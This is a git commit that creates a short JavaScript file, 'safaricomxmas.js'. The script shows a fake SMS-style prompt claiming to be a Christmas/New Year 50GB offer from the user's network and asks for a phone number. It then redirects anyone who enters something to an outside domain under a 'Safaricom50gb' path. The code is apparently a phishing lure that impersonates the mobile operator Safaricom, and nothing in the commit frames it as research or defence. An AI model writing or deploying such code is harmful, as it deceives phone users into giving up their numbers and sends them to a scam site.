63451c11815a84080ee0e89909f487f919ed8518
newetijazz11 <newetijazz11@gmail.com>
2025-12-30 14:10:53 +0100

    Create safaricomxmas.js

---
+++ safaricomxmas.js
@@ -0,0 +1,8 @@
+var password = 'ACTIVATE 50GB'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive Christmas/New year offer from your favourite network. Please press OK to Enter your Phone Number.',
+  'ACTIVATE 50GB'
+);
+if (password != 'ACTIVATE 50GB') {
+  location.href = 'https://www.bhufrizx.online/Safaricom50gb';
+}
